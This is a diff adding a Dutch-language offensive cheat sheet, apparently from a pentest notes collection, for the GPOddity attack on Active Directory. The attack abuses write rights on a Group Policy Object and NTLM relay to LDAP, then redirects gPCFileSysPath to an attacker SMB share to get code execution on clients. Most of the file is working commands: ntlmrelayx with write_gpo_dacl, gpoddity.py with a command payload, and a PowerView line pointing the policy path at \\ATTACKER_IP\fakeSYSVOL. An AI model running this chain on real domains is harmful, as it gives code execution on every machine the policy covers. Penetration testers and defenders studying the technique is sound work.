@@ -1,0 +1,37 @@
+# GPOddity — GPO abuse via gPCFileSysPath spoofing + NTLM relay
+# Misbruikt GenericAll/GenericWrite op een GPO om code uit te voeren
+# Combineert gPCFileSysPath manipulatie met NTLM relay naar LDAP
+#
+# === Vereisten ===
+# - GenericAll, GenericWrite, of WriteDacl op een GPO
+# - NTLM relay mogelijk naar LDAP (geen LDAP signing/channel binding)
+# - ntlmrelayx + GPOddity tooling
+#
+# === Aanvalsketen ===
+# 1. ntlmrelayx met LDAP shell → write_gpo_dacl op doel-GPO
+# 2. GPOddity spooft gPCFileSysPath naar attacker SMB share
+# 3. Attacker serveert malicious scheduled task via nep SYSVOL
+# 4. Clients passen GPO toe → code execution
+#
+# === Voorbeelden ===
+
+# Stap 1: Check GPO permissies
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl' -and $_.SecurityIdentifier -match 'S-1-5-21-.*-\d{4,}$' }
+
+# Stap 2: ntlmrelayx met LDAP shell
+python3 ntlmrelayx.py -t ldap://DC --no-da --no-acl --no-validate-privs -smb2support
+# In de LDAP shell:
+# write_gpo_dacl <USER> <GPO_DN>
+
+# Stap 3: GPOddity — spoof gPCFileSysPath en serveer malicious task
+python3 gpoddity.py -d DOMAIN -u USER -p PASS -gpo-id '{GPO-GUID}' -command 'cmd /c whoami > C:\proof.txt'
+
+# Stap 4: Forceer GPO update op doelwit (als je al toegang hebt)
+gpupdate /force
+
+# Alternatief: handmatig gPCFileSysPath aanpassen via PowerView
+Set-DomainObject -Identity 'CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=local' -Set @{'gPCFileSysPath'='\\ATTACKER_IP\fakeSYSVOL\domain\Policies\{GPO-GUID}'}
+
+# Noot: Zeer krachtig — treft alle computers/users waarop de GPO van toepassing is
+# Noot: gPCFileSysPath wijst normaal naar \\domain\SYSVOL\... — redirect naar attacker share
+# Noot: Download: https://github.com/synacktiv/GPOddity
